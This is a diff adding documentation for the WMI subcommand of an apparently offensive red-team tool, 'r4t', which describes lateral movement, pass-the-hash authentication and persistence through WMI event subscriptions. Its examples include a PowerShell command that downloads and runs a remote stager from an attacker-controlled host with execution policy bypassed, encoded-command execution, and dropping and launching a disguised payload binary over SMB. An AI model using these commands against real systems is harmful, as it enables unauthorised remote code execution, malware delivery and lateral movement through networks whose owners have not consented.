@@ -1,15 +1,114 @@
 # wmi
 
-Windows Management Instrumentation (WMI) operations.
+The `wmi` command provides Windows Management Instrumentation (WMI) operations for remote system querying and command execution via DCOM/RPC.
 
 ---
 
 ## Usage
 
 ```
-r4t wmi [flags]
+r4t wmi <subcommand> [flags]
 ```
 
-> **Status**: Base command registered. Subcommands are not yet implemented.
+---
 
-WMI support is planned for remote system querying and command execution via DCOM/WMI (port 135 + dynamic RPC ports). When implemented, it will use the global authentication flags.
+## Overview
+
+WMI enables operators to interact with remote Windows hosts using the WMI protocol over DCOM (port 135 + dynamic RPC ports). It provides capabilities for remote process execution, system enumeration, and arbitrary WQL queries — all without requiring SMB file transfers or WinRM to be enabled.
+
+WMI is a powerful lateral movement and execution vector because it is natively available on all Windows systems and often permitted through firewalls in enterprise environments.
+
+---
+
+## Planned Capabilities
+
+| Capability | Description |
+|-----------|-------------|
+| **Process Execution** | Execute commands on remote hosts via `Win32_Process.Create` |
+| **WQL Queries** | Run arbitrary WQL queries against remote WMI namespaces |
+| **System Enumeration** | Query installed software, services, OS details, and hardware |
+| **Event Subscription** | Create WMI event subscriptions for persistence |
+
+---
+
+## Authentication
+
+WMI uses the same global authentication flags as all other R4t commands. The following authentication methods are supported:
+
+| Method | Flag | Description |
+|--------|------|-------------|
+| Password | `-u` / `-p` | Domain username and password |
+| NTLM Hash | `--hash` | Pass-the-hash via NT hash |
+| Kerberos | `--aes` / `--ccache` | Kerberos authentication via AES key or ccache |
+| Certificate (PFX) | `--pfx` | PFX certificate authentication |
+| Certificate (PEM) | `--cert` / `--key` | PEM certificate and key authentication |
+| Anonymous | `--anonymous` | Unauthenticated access (rarely useful for WMI) |
+
+```bash
+# Execute a command via WMI with password auth
+r4t wmi exec -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 "whoami"
+
+# Query remote system info with hash
+r4t wmi query -u admin --hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 10.10.10.20 "SELECT * FROM Win32_OperatingSystem"
+
+# Use stored credentials
+r4t wmi exec --credential-id 1 10.10.10.20 "hostname"
+```
+
+---
+
+## Connection Details
+
+| Property | Value |
+|----------|-------|
+| Protocol | DCOM / DCE/RPC |
+| Initial Port | 135 (RPC Endpoint Mapper) |
+| Data Ports | Dynamic high ports (49152–65535) |
+| Namespace | `root\cimv2` (default) |
+| Library | `github.com/microsoft/wmi` via `go-ole` |
+
+---
+
+## Payload Execution via WMI
+
+WMI process creation (`Win32_Process.Create`) is a common execution primitive for lateral movement. The payload factory can generate artifacts suited for WMI-based delivery:
+
+```bash
+# Execute a staged payload via WMI
+r4t wmi exec -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 \
+  "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/stager.ps1')"
+
+# Execute an encoded command
+r4t wmi exec -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 \
+  "powershell -ep bypass -enc <base64-encoded-command>"
+
+# Drop and execute via SMB + WMI combination
+r4t smb put -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 ./payload.exe C:\Windows\Temp\svc.exe
+r4t wmi exec -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 "C:\Windows\Temp\svc.exe"
+```
+
+### Payload Factory Integration
+
+When the payload factory is operational, WMI execution modules will request artifacts by capability rather than filename:
+
+| Capability Request | Use Case |
+|-------------------|----------|
+| `execution=self-exec`, `os=windows` | Standard EXE dropped to disk then executed |
+| `execution=script`, `type=ps1` | PowerShell stager executed inline |
+| `inmemory=true`, `execution=script` | Fileless execution via encoded PowerShell |
+| `execution=service` | Service binary for persistence via WMI event subscription |
+
+---
+
+## Spray Integration
+
+WMI-based credential validation is not currently available as a standalone spray protocol but can be tested through the standard WMI authentication flow.
+
+---
+
+## Related Commands
+
+- [`winrm`](./winrm) — WinRM remote command execution (alternative to WMI)
+- [`smb`](./smb) — SMB operations (file transfer for payload staging)
+- [`spray`](./spray) — Multi-protocol credential spraying
+- [`rpc`](./rpc) — DCE/RPC operations
